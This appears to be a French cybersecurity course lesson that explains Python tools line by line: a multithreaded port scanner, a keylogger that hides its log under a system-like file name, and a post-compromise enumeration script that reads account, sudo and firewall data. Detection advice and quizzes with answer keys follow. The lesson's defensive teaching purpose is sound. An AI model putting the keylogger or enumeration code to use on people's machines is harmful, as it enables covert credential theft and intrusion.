# TOME P0 — Socle Universel — Jour 33 (6h) : Python pour la Cybersécurité — Lire & Comprendre le Code Offensif/Défensif

> [!NOTE]
> **Objectif du jour :** Apprendre à lire, analyser et comprendre des scripts Python utilisés en cybersécurité — scanner de ports, keylogger, collecteur de métadonnées. L'objectif est de **comprendre** le fonctionnement de ces outils pour mieux les détecter et s'en défendre, pas de les coder from scratch.
>
> **Compétences visées :** `SEC-05` (A) — Lecture et analyse de code de sécurité | `BIT-05` (A) — Scripting avancé

---

## 1) Module — Anatomie d'un Scanner de Ports (2h)

### 📖 Narration/Intuition

Un **scanner de ports** est l'un des outils les plus fondamentaux en cybersécurité offensive et défensive. En phase de reconnaissance (Recon), un attaquant l'utilise pour cartographier les services exposés. Un défenseur l'utilise pour auditer sa propre infrastructure. 

Nmap est l'outil industriel, mais comprendre un scanner Python basique permet de saisir le mécanisme sous-jacent : on tente d'établir une connexion TCP sur chaque port cible. Si la connexion réussit → port ouvert. Si elle échoue ou timeout → port fermé ou filtré.

### 🔍 Anatomie Technique

**Scanner de ports TCP simple — décorticage ligne par ligne :**

```python
#!/usr/bin/env python3
"""
Scanner de ports TCP — Usage pédagogique et audit interne UNIQUEMENT.
Ne jamais scanner des systèmes sans autorisation explicite.
"""
import socket          # Bibliothèque réseau standard Python
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor  # Multi-threading

# ─── Configuration ───────────────────────────────────────────────
TIMEOUT = 1          # Secondes d'attente avant de déclarer un port fermé
MAX_THREADS = 100    # Nombre de threads parallèles maximum

# ─── Fonction de test d'un port ──────────────────────────────────
def tester_port(hote, port):
    """
    Teste si un port TCP est ouvert sur l'hôte.
    
    Retourne True si le port répond (connexion établie),
    False sinon (refus de connexion, timeout, ou erreur réseau).
    """
    try:
        # Création d'un socket IPv4 TCP
        # AF_INET = famille d'adresses IPv4
        # SOCK_STREAM = type socket TCP (connexion orientée)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(TIMEOUT)  # Limite le temps d'attente
            
            # connect_ex() : comme connect() mais retourne un code d'erreur
            # au lieu de lever une exception
            # 0 = connexion réussie (port OUVERT)
            # autre = erreur (port FERMÉ ou FILTRÉ)
            code_retour = sock.connect_ex((hote, port))
            return code_retour == 0
            
    except socket.gaierror:
        # gaierror = erreur de résolution DNS
        # Ex: hostname "serveur.inexistant" → impossible à résoudre
        print(f"Erreur : impossible de résoudre '{hote}'")
        sys.exit(1)
    except OSError:
        return False

# ─── Résolution DNS ──────────────────────────────────────────────
def resoudre_hote(hote):
    """Résout un nom d'hôte en adresse IP."""
    try:
        # gethostbyname() : résolution DNS simple
        ip = socket.gethostbyname(hote)
        print(f"Cible : {hote} → {ip}")
        return ip
    except socket.gaierror:
        print(f"Impossible de résoudre : {hote}")
        sys.exit(1)

# ─── Identification du service ───────────────────────────────────
def identifier_service(port):
    """Retourne le nom du service standard associé au port."""
    # getservbyport() interroge /etc/services
    try:
        return socket.getservbyport(port)
    except OSError:
        return "inconnu"

# ─── Scanner principal ───────────────────────────────────────────
def scanner(hote, port_debut=1, port_fin=1024):
    """Scanner multi-threadé des ports TCP."""
    ip = resoudre_hote(hote)
    print(f"Début du scan : {datetime.now().strftime('%H:%M:%S')}")
    print(f"Plage : ports {port_debut} à {port_fin}")
    print("-" * 40)
    
    ports_ouverts = []
    
    # ThreadPoolExecutor : exécute plusieurs tests en parallèle
    # (beaucoup plus rapide qu'une boucle séquentielle)
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        # map() applique tester_port sur chaque port
        # On utilise lambda pour fixer le paramètre 'hote'
        futurs = {
            executor.submit(tester_port, ip, port): port
            for port in range(port_debut, port_fin + 1)
        }
        
        for futur, port in futurs.items():
            if futur.result():
                service = identifier_service(port)
                print(f"[OUVERT] Port {port:5d}/tcp  ({service})")
                ports_ouverts.append(port)
    
    print("-" * 40)
    print(f"Scan terminé : {len(ports_ouverts)} port(s) ouvert(s)")
    return sorted(ports_ouverts)

# ─── Point d'entrée ──────────────────────────────────────────────
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <hôte> [port_debut] [port_fin]")
        print(f"Ex:    {sys.argv[0]} 192.168.1.1 1 1024")
        sys.exit(1)
    
    cible = sys.argv[1]
    debut = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    fin   = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
    
    scanner(cible, debut, fin)
```

**Analyse défensive — Comment détecter ce script en prod ?**
- Génère un grand nombre de connexions TCP en très peu de temps
- Visible dans les logs du firewall : nombreuses connexions refusées depuis la même IP
- Détectable par un IDS/IPS (pattern : scan de ports séquentiels)
- Contre-mesure : `fail2ban`, limitation de connexions par IP (`iptables -m connlimit`)

### 🛠️ Atelier Pratique — Lecture Guidée

Sans exécuter le code, répondez :
1. Pourquoi `connect_ex()` est-il préféré à `connect()` dans ce contexte ?
2. Que se passe-t-il si `TIMEOUT = 0.1` au lieu de `1` ?
3. Pourquoi utiliser `ThreadPoolExecutor` plutôt qu'une boucle simple ?
4. Que fait `sys.exit(1)` dans `resoudre_hote()` ?

**Corrigés :**
1. `connect_ex()` retourne un code d'erreur sans lever d'exception → plus propre dans une boucle
2. Moins de fiabilité (timeout court → faux négatifs sur ports lents), mais scan plus rapide
3. Le multi-threading parallélise les tentatives → scan 100x plus rapide
4. Arrête le programme immédiatement avec un code d'erreur (1 = échec)

---

## 2) Module — Anatomie d'un Keylogger Python (2h)

### 📖 Narration/Intuition

Un **keylogger** enregistre toutes les touches frappées au clavier. C'est l'un des malwares les plus anciens et les plus efficaces pour dérober des mots de passe et des données confidentielles. Comprendre son fonctionnement permet de le détecter, de le bloquer, et de former les utilisateurs à ses risques.

> [!WARNING]
> Ce code est présenté à des fins **pédagogiques uniquement**. L'installation d'un keylogger sur un système sans autorisation est une infraction pénale grave dans la plupart des pays, incluant le Congo. La compréhension de cet outil vise à améliorer la défense, pas l'attaque.

### 🔍 Anatomie Technique

**Keylogger simple avec pynput — décorticage :**

```python
#!/usr/bin/env python3
"""
Keylogger pédagogique — USAGE ÉDUCATIF UNIQUEMENT.
Nécessite : pip install pynput
"""
from pynput import keyboard  # Bibliothèque d'écoute des événements clavier
import logging               # Pour enregistrer les frappes dans un fichier
import os
from datetime import datetime

# ─── Configuration du journal ────────────────────────────────────
# logging.basicConfig() configure le système de journalisation
logging.basicConfig(
    filename=os.path.expanduser("~/.cache/sys_log.txt"),  # Fichier caché
    level=logging.DEBUG,      # Enregistre tous les niveaux de messages
    format="%(asctime)s - %(message)s"  # Format : timestamp - message
)

# ─── Compteur de frappes ─────────────────────────────────────────
compte = {"frappes": 0, "mots": 0}
tampon = []  # Buffer accumulant les caractères d'un mot

# ─── Callback : appelé à CHAQUE touche pressée ───────────────────
def sur_pression(touche):
    """
    Fonction de callback appelée par pynput à chaque frappe.
    pynput distingue les Key spéciales (Key.enter, Key.space...)
    des touches normales (caractères alphanumériques).
    """
    global tampon
    
    try:
        # Touche normale : caractère alphanumérique
        # touche.char contient le caractère (ex: 'a', 'B', '3')
        car = touche.char
        tampon.append(car)
        compte["frappes"] += 1
        
    except AttributeError:
        # Touche spéciale : Enter, Space, Backspace, Ctrl, Alt...
        # touche.char lève AttributeError pour les touches spéciales
        
        if touche == keyboard.Key.space:
            # Espace = fin d'un mot → enregistrer le mot accumulé
            mot = "".join(tampon)
            if mot:
                logging.info(f"MOT: {mot}")
                compte["mots"] += 1
            tampon = []  # Réinitialiser le buffer
            
        elif touche == keyboard.Key.enter:
            # Entrée = fin de ligne → enregistrer tout le buffer
            ligne = "".join(tampon)
            logging.info(f"LIGNE: {ligne}")
            tampon = []
            
        elif touche == keyboard.Key.backspace:
            # Backspace = correction → supprimer le dernier caractère
            if tampon:
                tampon.pop()
        
        else:
            # Autre touche spéciale : Ctrl, Alt, F1-F12...
            logging.debug(f"SPECIAL: {touche}")

# ─── Callback : appelé quand une touche est RELÂCHÉE ─────────────
def sur_relachement(touche):
    """Arrête l'écoute si Echap est pressé."""
    if touche == keyboard.Key.esc:
        logging.info(f"Arrêt — {compte['frappes']} frappes, {compte['mots']} mots")
        return False  # Retourner False arrête le Listener pynput

# ─── Démarrage de l'écoute ───────────────────────────────────────
# Listener : thread d'arrière-plan qui écoute les événements clavier
# on_press  : callback appelé à chaque pression
# on_release: callback appelé à chaque relâchement
with keyboard.Listener(
    on_press=sur_pression,
    on_release=sur_relachement
) as listener:
    print(f"[INFO] Écoute clavier active. Appuyez sur Echap pour arrêter.")
    listener.join()  # Attend que le Listener se termine
```

**Signaux défensifs — Comment détecter ce keylogger ?**

| Indicateur | Détail |
|:---:|:---|
| **Processus suspect** | `python3` avec un script dans `~/.cache/` ou `/tmp/` |
| **Fichier de log caché** | `~/.cache/sys_log.txt` — nom imitant un log système |
| **Permissions** | Le processus a accès aux événements d'entrée (`/dev/input`) |
| **Réseau** | Variantes avancées exfiltrent via HTTP/SMTP/DNS |

**Contre-mesures :**
```bash
# Surveiller les processus Python inconnus
ps aux | grep python3

# Vérifier les fichiers récemment modifiés dans les dossiers utilisateurs
find ~ -name "*.txt" -newer /etc/passwd -type f

# Surveiller les accès à /dev/input (clavier physique)
sudo inotifywait -m /dev/input/

# SELinux/AppArmor limitent l'accès aux périphériques d'entrée
```

### 🛠️ Atelier Pratique — Analyse de Comportement

**Exercice :** Sans exécuter le keylogger, identifiez :
1. Où est stocké le fichier de log ? Pourquoi ce chemin est-il choisi ?
2. Quelle technique de discrétion est utilisée dans le nom du fichier ?
3. Comment un attaquant pourrait-il améliorer ce keylogger pour exfiltrer les données ?
4. Quelle ligne arrête définitivement l'écoute ?

---

## 3) Module — Script de Collecte de Métadonnées Système (2h)

### 📖 Narration/Intuition

La **collecte de métadonnées** (ou **enumeration**) est la phase de reconnaissance interne d'une attaque. Après avoir pris pied sur un système, un attaquant collecte automatiquement toutes les informations utiles : OS, utilisateurs, réseau, processus, services. Ce type de script est aussi utilisé légitimement par les équipes de réponse à incident (IR) pour comprendre l'état d'un système compromis.

### 🔍 Anatomie Technique

**Script de collecte de métadonnées système :**

```python
#!/usr/bin/env python3
"""
Collecteur de métadonnées système — outil d'audit/forensics.
Usage : python3 collect_metadata.py > rapport_$(hostname).json
"""
import os
import sys
import json
import socket
import subprocess
import platform
from datetime import datetime

def executer(cmd):
    """Exécute une commande et retourne sa sortie (ou erreur)."""
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=5
        )
        return r.stdout.strip() if r.returncode == 0 else f"ERREUR: {r.stderr.strip()}"
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return f"EXCEPTION: {e}"

def collecter_systeme():
    """Informations sur l'OS et le matériel."""
    return {
        "hostname"    : socket.gethostname(),
        "fqdn"        : socket.getfqdn(),         # Fully Qualified Domain Name
        "os"          : platform.system(),         # 'Linux', 'Windows', 'Darwin'
        "os_version"  : platform.release(),
        "architecture": platform.machine(),        # 'x86_64', 'aarch64'...
        "python"      : sys.version,
        "uptime"      : executer(["uptime", "-p"]),
        "date_collecte": datetime.utcnow().isoformat() + "Z",
    }

def collecter_reseau():
    """Interfaces réseau et connectivité."""
    interfaces = {}
    
    # Récupération des interfaces via 'ip addr'
    sortie_ip = executer(["ip", "-j", "addr"])  # Format JSON natif
    try:
        ifaces = json.loads(sortie_ip)
        for iface in ifaces:
            nom = iface.get("ifname", "?")
            adresses = [
                a.get("local", "")
                for a in iface.get("addr_info", [])
                if a.get("local")
            ]
            if adresses:
                interfaces[nom] = adresses
    except json.JSONDecodeError:
        interfaces["erreur"] = "ip -j non disponible"
    
    return {
        "interfaces"    : interfaces,
        "routes"        : executer(["ip", "route"]),
        "dns_resolvers" : executer(["cat", "/etc/resolv.conf"]),
        "ports_ecoute"  : executer(["ss", "-tlnp"]),
        "connexions"    : executer(["ss", "-tnp", "state", "established"]),
    }

def collecter_utilisateurs():
    """Comptes utilisateurs et sessions actives."""
    utilisateurs = []
    
    try:
        with open("/etc/passwd", "r") as f:
            for ligne in f:
                if ligne.startswith("#"):
                    continue
                parts = ligne.strip().split(":")
                if len(parts) >= 7:
                    shell = parts[6]
                    # Filtre : uniquement les comptes avec shell interactif
                    if shell not in ["/usr/sbin/nologin", "/bin/false", "/sbin/nologin"]:
                        utilisateurs.append({
                            "nom"  : parts[0],
                            "uid"  : int(parts[2]),
                            "gid"  : int(parts[3]),
                            "home" : parts[5],
                            "shell": shell,
                        })
    except PermissionError:
        utilisateurs = [{"erreur": "Accès refusé"}]
    
    return {
        "comptes_interactifs": utilisateurs,
        "sessions_actives"  : executer(["who"]),
        "historique_sudo"   : executer(["grep", "-i", "sudo", "/var/log/auth.log"]),
        "sudoers"           : executer(["cat", "/etc/sudoers.d/README"]),
    }

def collecter_processus():
    """Processus en cours d'exécution."""
    return {
        "liste"           : executer(["ps", "aux", "--no-header"]),
        "services_actifs" : executer(["systemctl", "list-units", "--type=service", "--state=running", "--no-pager"]),
        "crontabs_systeme": executer(["ls", "-la", "/etc/cron.d/"]),
    }

def collecter_securite():
    """Posture de sécurité du système."""
    return {
        "selinux"         : executer(["getenforce"]),
        "apparmor"        : executer(["aa-status"]),
        "ufw_status"      : executer(["ufw", "status", "verbose"]),
        "iptables_rules"  : executer(["iptables", "-L", "-n", "--line-numbers"]),
        "packages_updates": executer(["apt", "list", "--upgradable"]),
        "ssh_config"      : executer(["sshd", "-T"]),
    }

# ─── Collecte complète ───────────────────────────────────────────
def main():
    rapport = {
        "meta"       : {"outil": "collect_metadata.py", "version": "1.0"},
        "systeme"    : collecter_systeme(),
        "reseau"     : collecter_reseau(),
        "utilisateurs": collecter_utilisateurs(),
        "processus"  : collecter_processus(),
        "securite"   : collecter_securite(),
    }
    
    print(json.dumps(rapport, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

**Analyse défensive — utilisation légitime vs malveillante :**

| Contexte | Utilisation |
|:---:|:---|
| **Équipe IR** (Incident Response) | Collecter l'état du système après détection d'une compromission |
| **Audit de sécurité** | Inventaire des services et comptes exposés |
| **Attaquant post-exploitation** | Reconnaissance interne après accès initial |
| **Script de déploiement** | Vérification de la configuration lors du provisioning |

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **APT** | Advanced Persistent Threat — groupe d'attaquants sophistiqués et persistants |
| **IR** | Incident Response — réponse à incident de sécurité |
| **IOC** | Indicator of Compromise — indicateur de compromission |
| **TTL** | Time-To-Live (réseau) / Time-To-Live (sécurité : durée de validité) |
| **FQDN** | Fully Qualified Domain Name — nom de domaine complet (ex: server.bcc.cd) |
| **EDR** | Endpoint Detection and Response — solution de détection sur les postes de travail |
| **SIEM** | Security Information and Event Management — plateforme de gestion des événements de sécurité |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 — Lecture critique :** Dans `collecter_utilisateurs()`, pourquoi filtre-t-on les shells `/usr/sbin/nologin` et `/bin/false` ?

**Corrigé :** Ces shells empêchent la connexion interactive. Un compte avec ce shell est un compte de service (ex: `www-data`, `daemon`) qui ne peut pas se connecter. Filtrer ces comptes permet de se concentrer sur les **comptes humains** réels qui représentent un vecteur d'attaque potentiel.

**Exercice 2 :** Identifiez 3 informations collectées par `collecter_securite()` et expliquez leur intérêt pour un attaquant.

**Corrigé :**
1. `selinux/apparmor` → savoir si le MAC (Mandatory Access Control) limite l'attaquant
2. `ufw_status/iptables` → cartographier les règles de filtrage pour identifier des voies de communication possibles
3. `packages_updates` → identifier les packages non mis à jour contenant des CVE connues

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Un script Python utilise `eval(input("Entrez du code: "))`. Quelle vulnérabilité introduit-il ?
- A) Fuite mémoire
- B) Exécution de code arbitraire par injection
- C) Déni de service uniquement
- D) Erreur de syntaxe systématique

**Réponse : B**

---

**Q2 :** Dans le keylogger, que fait `return False` dans la fonction `sur_relachement()` ?
- A) Retourne False comme résultat du script
- B) Arrête le Listener pynput (convention de la bibliothèque)
- C) Supprime le fichier de log
- D) Désactive le clavier système

**Réponse : B**

---

**Q3 :** `socket.AF_INET` et `socket.SOCK_STREAM` correspondent respectivement à :
- A) IPv6 et UDP
- B) IPv4 et TCP
- C) IPv4 et UDP
- D) Bluetooth et TCP

**Réponse : B** — `AF_INET` = IPv4, `SOCK_STREAM` = TCP (orienté connexion).

---

**Q4 :** La fonction `executer(cmd)` utilise `timeout=5`. Que se passe-t-il si la commande dure 10 secondes ?
- A) La commande continue jusqu'à la fin
- B) Le script plante avec une erreur fatale
- C) L'exception `TimeoutExpired` est attrapée et un message d'erreur est retourné
- D) La commande est relancée automatiquement

**Réponse : C** — Le bloc `except subprocess.TimeoutExpired` gère ce cas.

---

**Q5 :** Un attaquant exécute le script de collecte de métadonnées sur votre serveur. Quelle est la première défense à mettre en place pour limiter l'impact ?
- A) Désactiver Python3 sur tous les serveurs
- B) Appliquer le principe du moindre privilège — l'attaquant ne devrait pas pouvoir lire `/etc/sudoers`, les configs réseau, etc.
- C) Supprimer tous les comptes utilisateurs
- D) Désactiver le réseau

**Réponse : B** — Le moindre privilège (PoLP) limite ce qu'un attaquant peut collecter même s'il a accès au système.

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
